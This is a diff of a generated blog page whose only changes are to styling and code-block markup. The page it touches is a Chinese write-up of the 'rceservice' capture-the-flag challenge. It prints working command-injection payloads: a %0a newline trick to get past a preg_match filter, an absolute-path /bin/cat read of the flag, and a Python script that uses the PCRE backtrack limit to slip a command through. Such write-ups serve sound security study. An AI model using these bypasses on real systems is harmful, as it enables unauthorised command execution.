@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -247,7 +255,7 @@
             <div class="markdown-body">
               <h2 id="‘o’-‘o’"><a href="#‘o’-‘o’" class="headerlink" title="‘o’  ‘o’"></a>‘o’  ‘o’</h2><p><img src="https://ftp.bmp.ovh/imgs/2021/03/4d9c90c2ba9a44e4.png" srcset="/img/loading.gif"><br>命令执行<br>ls一下，用JSON格式：<code>&#123;&quot;cmd&quot;:&quot;ls&quot;&#125;</code><br>得到一个<code>index.php</code><br>除此之外，输入其他命令会报错，过滤了    </p>
 <p>看WP都直接给出的源码，也不知道哪来的<code>‘？’</code>       </p>
-<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 
 putenv(<span class="hljs-string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);
 
@@ -270,16 +278,16 @@ putenv(<span class="hljs-string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);
   &#125;
 &#125;
 
-<span class="hljs-meta">?&gt;</span></code></pre></div></code></pre>
+<span class="hljs-meta">?&gt;</span></code></pre></code></pre>
 <p><code>putenv — 设置环境变量的值</code><br>设置了环境变量，但可以ls，是因为路径下有ls的二进制文件<br><code>%0a</code>绕过<code>preg_match</code><br><code>?cmd=&#123;%0A&quot;cmd&quot;%3A&quot;ls+%2Fhome%2Frceservice&quot;%0A&#125;</code>直接在URL中输入，表单提交的话<code>%0a</code>会被再次编码，出不来<br><img src="https://ftp.bmp.ovh/imgs/2021/03/67a2d29f30e10e8a.png" srcset="/img/loading.gif"><br>cat没法用，可以用绝对路径<code>/bin/cat</code><br><code>?cmd=&#123;%0A&quot;cmd&quot;%3A&quot;/bin/cat+%2Fhome%2Frceservice/flag&quot;%0A&#125;</code>          </p>
 <p><strong>回溯绕过</strong>     </p>
 <p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html#0x03-phppcrebacktrack_limit">P神：PHP利用PCRE回溯次数限制绕过某些安全限制</a>        </p>
-<div class="hljs"><pre><code><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
+<pre><code><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
 
 payload = <span class="hljs-string">&#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,&quot;test&quot;:&quot;&#x27;</span> + <span class="hljs-string">&quot;a&quot;</span>*(<span class="hljs-number">1000000</span>) + <span class="hljs-string">&#x27;&quot;&#125;&#x27;</span>
 res = requests.post(<span class="hljs-string">&quot;http://0c2928b7-761f-4fac-be5e-291db6ec5085.node3.buuoj.cn/&quot;</span>, data=&#123;<span class="hljs-string">&quot;cmd&quot;</span>:payload&#125;)
 <span class="hljs-comment">#print(payload)</span>
-print(res.text)</code></pre></div></code></pre>
+print(res.text)</code></pre></code></pre>
 
             </div>
             <hr>
@@ -424,6 +432,8 @@ print(res.text)</code></pre></div></code></pre>
 
 
 
+  
+    
   
 
 
